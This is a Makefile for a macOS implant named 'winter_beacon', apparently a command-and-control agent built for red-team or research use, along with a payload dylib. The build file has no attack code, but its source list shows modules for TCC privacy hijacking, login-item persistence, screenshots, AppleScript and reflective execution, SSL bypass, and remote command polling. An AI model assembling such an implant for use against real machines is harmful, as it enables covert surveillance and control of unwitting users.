CC = clang

# Main beacon flags - using modern macOS target
CFLAGS = -Wall -Wextra -g -O0 -framework Foundation -framework Security -framework AppKit -framework ScreenCaptureKit -framework CoreMedia -framework CoreImage -ObjC -I. -Iloader/include -mmacosx-version-min=13.0
LDFLAGS = -L./loader/build -lloader -lc++ -lc++abi

# Source files
SOURCES = main.m ZBeacon.m ZAPIClient.m ZSSLBypass.m ZSystemInfo.m \
          ZCommandModel.m ZCommandHandler.m ZCommandRegistry.m ZCommandService.m \
          ZCommandPoller.m ZCommandReporter.m ZCommandExecutor.m \
          commands/ZEchoCommandHandler.m commands/ZDialogCommandHandler.m commands/ZWhoAmICommandHandler.m commands/ZTCCJackCommandHandler.m commands/ZLoginItemCommandHandler.m commands/ZTCCCheckCommandHandler.m \
          commands/ZScreenshotCommandHandler.m commands/ZLSCommandHandler.m commands/ZPWDCommandHandler.m commands/ZAppleScriptCommandHandler.m commands/ZReflectiveCommandHandler.m
OBJECTS = $(SOURCES:.m=.o)
TARGET = winter_beacon

# Payload settings
PAYLOAD_SRC = payload.m
PAYLOAD_OBJ = $(PAYLOAD_SRC:.m=.o)
PAYLOAD_LIB = libpayload.dylib

# Set SDK paths
MACOS_SDK = $(shell xcrun --show-sdk-path)

# Payload specific flags - using same modern target
PAYLOAD_FLAGS = -fPIC -c -mmacosx-version-min=13.0
PAYLOAD_LDFLAGS = -dynamiclib -mmacosx-version-min=13.0 -framework Foundation

# Debug mode flags
DEBUG ?= 1
ifeq ($(DEBUG), 1)
	CFLAGS += -DDEBUG=1 -fno-omit-frame-pointer
else
	CFLAGS += -DDEBUG=0 -O2
endif

all: $(TARGET) $(PAYLOAD_LIB)

# Rule to link the final executable
$(TARGET): $(OBJECTS)
	@echo "Linking $@..."
	@$(CC) $(CFLAGS) -o $@ $(OBJECTS) $(LDFLAGS)
	@echo "Build complete: $@"
	@echo "Run with: ./$(TARGET) --url=https://localhost:4444"

# Rule to compile .m files to .o files
%.o: %.m
	@echo "Compiling $<..."
	@$(CC) $(CFLAGS) -c $< -o $@

# Clean rule
clean:
	@echo "Cleaning build artifacts..."
	@rm -f $(TARGET) $(OBJECTS) $(PAYLOAD_OBJ) $(PAYLOAD_LIB)
	@rm -rf *.dSYM
	@echo "Clean complete"

# Run target
run: $(TARGET)
	@echo "Running $(TARGET)..."
	@./$(TARGET)

# Debug run target
debug: $(TARGET)
	@echo "Running $(TARGET) in debug mode..."
	@./$(TARGET) --debug

# Payload compilation rules
$(PAYLOAD_LIB): $(PAYLOAD_OBJ)
	@echo "Building payload dylib..."
	@echo "Using compiler: $(CC)"
	@echo "Using SDK path: $(MACOS_SDK)"
	@echo "Using flags: $(PAYLOAD_LDFLAGS)"
	$(CC) $(PAYLOAD_LDFLAGS) $^ -o $@
	@echo "\nPayload build complete"

$(PAYLOAD_OBJ): $(PAYLOAD_SRC)
	@echo "Compiling payload..."
	@echo "Using flags: $(PAYLOAD_FLAGS)"
	$(CC) $(PAYLOAD_FLAGS) $< -o $@

verify_targets: $(TARGET) $(PAYLOAD_LIB)
	@echo "Verifying deployment targets..."
	@echo "\nChecking beacon deployment target:"
	@otool -l $(TARGET) | grep -A 2 LC_VERSION_MIN
	@echo "\nChecking payload deployment target:"
	@otool -l $(PAYLOAD_LIB) | grep -A 2 LC_VERSION_MIN
	@echo "\nFull payload load commands:"
	@otool -l $(PAYLOAD_LIB)

.PHONY: all clean run debug verify_targets 